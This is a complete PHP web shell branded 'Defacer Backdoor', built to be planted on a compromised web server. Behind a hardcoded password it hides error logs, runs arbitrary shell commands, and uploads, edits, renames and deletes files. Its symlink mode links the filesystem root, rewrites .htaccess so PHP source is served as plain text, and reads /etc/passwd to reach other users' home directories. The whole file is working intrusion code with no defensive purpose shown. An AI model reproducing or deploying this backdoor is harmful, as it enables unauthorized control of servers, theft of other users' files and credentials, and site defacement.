<?php
error_reporting(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
$passwd = "errorbyte";
if($_POST['pass']) {
  if($_POST['passwd'] == $passwd) {
    $_SESSION['masuk'] = "masuk";
    header("Location: ?");
  }
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  header("Location: ?");
}
if(empty($_SESSION['masuk'])) {
?>
<title>Defacer Backdoor</title>
<style>
  html {
    background: black;
    color: white;
  }
  input {
    background: transparent;
    color: white;
    border: 1px solid white;
  }
</style>
<table height="100%" width="100%">
  <td align="center">
    <font size="20">Defacer Backdoor</font>
    <br><br>
    <form enctype="multipart/form-data" method="post">
      <input type="password" name="passwd">
      <input type="submit" name="pass" value="Login">
    </form>
  </td>
</table>
<?php
exit();
}
?>
<title>Defacer Backdoor</title>
<style>
  html {
    background: black;
    color: white;
  }
  input {
    background: transparent;
    color: white;
    border: 1px solid white;
  }
  a {
    text-decoration: none;
    color: white;
  }
  .file {
    width: 100%;
    height: 50%;
    background: transparent;
    color: white;
  }
  .cmnd {
    border:none;
    text-decoration: underline;
    border-bottom: 1px solid white;
  }
  .shell {
    width: 100%;
    height: 20%;
    background: transparent;
    color: white;
  }
  .c {
    background: white;
    color: black;
    padding: 10px;
  }
  td {
    padding: 10px;
  }
  .a-bar {
    text-decoration: none;
    color: black;
  }
  .bar {
    display: inline;
    padding: 5px;
    background: white;
    color: black;
  }
  .putih {
    background: white;
    color: black;
  }
</style>
<center>
<hr>
  <h1>Defacer Backdoor</h1>
<hr>
</center>
<b>Information Server</b>
<br><br>
<?php
echo "Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."<br>";
echo "Kernel : ".php_uname()."<br>";
?>
<hr>
<?php
$dir_raw = str_replace('\\', "/", getcwd());
$host = $_SERVER['HTTP_HOST'];
if($dn = $_GET['d']) {
  $_SESSION['dir'] = $dn;
  echo "<script>window.location = '?';</script>";
}
if(empty($_SESSION['dir'])) {
  $dir = $dir_raw;
} else {
  $dir = $_SESSION['dir'];
}
$exp = explode("/", $dir);
foreach($exp as $x=>$dirx) {
  if(empty($dirx)){
    continue;
  }
  $do .= "<li class='bar'><a class='a-bar' href='?d=";
  for($i=0;$i<=$x;$i++) {
    $do .= $exp[$i]."/";
  }
  $do .= "'>$dirx</a></li>\n";
}
chdir($dir);
?>
<?php
echo "Path : $do
<hr>
<center>
";
?>
<form enctype="multipart/form-data" method="post">
  <input type="file" name="upd">
  <input type="submit" value="Upload">
</form>
<?php
if($_FILES['upd']) {
  if(copy($_FILES['upd']['tmp_name'], $_FILES['upd']['name'])) {
    echo "<br>".$_FILES[upd][name]." Uploaded !!!";
  } else {
    echo "<br>Failed Upload ".$_FILES[upd][name]." !!!";
  }
}
?>
<hr>
[ <a href="?d=<?php echo dirname(__FILE__); ?>">Home</a> ] [ <a href="?symlink=true">Symlink</a> ] [ <a href="?logout">Log Out</a> ]
<hr>
</center>
<form enctype="multipart/form-data" method="post">
  Shell@<?php echo $_SERVER['HTTP_HOST'].":".$dir." $ "; ?><input class="cmnd" type="text" name="shell"><input type="submit" value="~">
</form>
<textarea class="shell">
<?php echo htmlspecialchars(shell_exec($_POST['shell'])); ?>
</textarea>
<center>
<hr>
<?php
if($_GET['symlink'] == "true") {
  if(!is_dir("defacer_sym")) {
    mkdir("defacer_sym");
  }
  if(!symlink("/", "defacer_sym/root")) {
      echo "<b>Symlink Disable</b>";
  }
  $hta="Options Indexes FollowSymLinks\nDirectoryIndex defacer\nAddType txt .php\nAddHandler txt .php\n";
  $htaccess=fopen("defacer_sym/.htaccess", "w");
  fwrite($htaccess, $hta);
  fclose($htaccess);
  echo "<b>Symlink</b><br><br>";
  $symlink = file_get_contents("/etc/passwd");
  $lined=explode("\n", $symlink);
  echo "<table height='100%'>";
  echo "<tr><td class='putih'>User</td><td class='putih'>Symlik</td></tr>";
  foreach($lined as $line_x) {
    if(empty($line_x)) {
      continue;
    }
    $user_x = explode(":", $line_x);
    echo "<tr><td>$user_x[0]</td><td><font color='red'><a href='defacer_sym/root/home/$user_x[0]'>Symlink</a></font></td>";
  }
  echo "</table>";
}
if($_GET['file']) {
  if(!$_GET['edit'] && !$_GET['delete'] && !$_GET['rename'] && !$_GET['rmfolder']) {
    echo "<textarea class='file'>".htmlspecialchars(file_get_contents($_GET[file]))."</textarea>";
  }
}
if($_GET['edit'] == "true") {
  echo "<form enctype='multipart/form-data' method='post'>
  <textarea class='file' name='edit_file'>".htmlspecialchars(file_get_contents($_GET['file']))."</textarea>
  <br><br>
  File Name : <input type='text' name='nama_f' value='$_GET[file]'>
  <br><br>
  <input type='submit' value='Save File'>
  </form>
  ";
  if($_POST['edit_file']) {
    unlink($_GET['file']);
    $fedit = fopen($_POST['nama_f'], "w");
    if(fwrite($fedit, $_POST['edit_file'])) {
      fclose($fedit);
      echo "<script>alert('Edit File Success !!!'); window.location = '?file=$_POST[nama_f]';</script>";
    } else {
      echo "<script>alert('Edit File Failed !!!'); window.location = '?file=$_POST[nama_f]';</script>";
    }
  }
}
if($_GET['rename'] == "true") {
  echo "<form enctype='multipart/form-data' method='post'>
  ".htmlspecialchars($_GET['file'])." [ To ] <input type='text' name='rename_file'>
  <input type='submit' value='Rename'>
  </form>
  ";
  if($_POST['rename_file']) {
    if(rename($_GET['file'], $_POST['rename_file'])) {
      echo "<script>alert('Success Renamed !!!'); window.location = '?';</script>";
    } else {
      echo "<script>alert('Failed Renamed !!!'); window.location = '?';</script>";
    }
  }
}
if($_GET['rmfolder'] == "true") {
  if(rmdir($_GET['folder'])) {
    echo "<script>alert('Folder Deleted !!!'); window.location = '?';</script>";
  } else {
    echo "<script>alert('This Folder is Failed Delete !!!'); window.location = '?';</script>";
  }
}
if($_GET['delete'] == "true") {
  if(unlink($_GET['file'])) {
    echo "<script>alert('File Deleted !!!'); window.location = '?';</script>";
  } else {
    echo "<script>alert('This File is Failed Delete !!!'); window.location = '?';</script>";
  }
}
if(empty($_GET)) {
?>
      <table width="100%">
        <tr>
          <th class="c">Name File</th>
          <th colspan="2" class="c">Action</th>
        </tr>
<?php
  $scndir = scandir($dir);
  foreach($scndir as $sdir) {
    if(is_dir($dir."/".$sdir)) {
      echo "<tr>
      <td><a href='?d=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png'/> ".htmlspecialchars($sdir)."</a></td>
      <td><a href='?file=$dir/$sdir&rename=true'>Rename</a></td>
      <td><a href='?folder=$dir/$sdir&rmfolder=true'>Delete</a></td>
      </tr>
      ";
    }
    if(is_file($dir."/".$sdir)) {
      echo "<tr>
      <td><a href='?file=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/file.png'/> ".htmlspecialchars($sdir)."</a></td>
      <td><a href='?file=$dir/$sdir&edit=true'>Edit</a></td>
      <td><a href='?file=$dir/$sdir&delete=true'>Delete</a></td>
      </tr>
      ";
    }
  }
?>
        </tr>
      </table>
<?php
}
?>
<hr>
Copyleft &copy;2019 - Defacer
<hr>
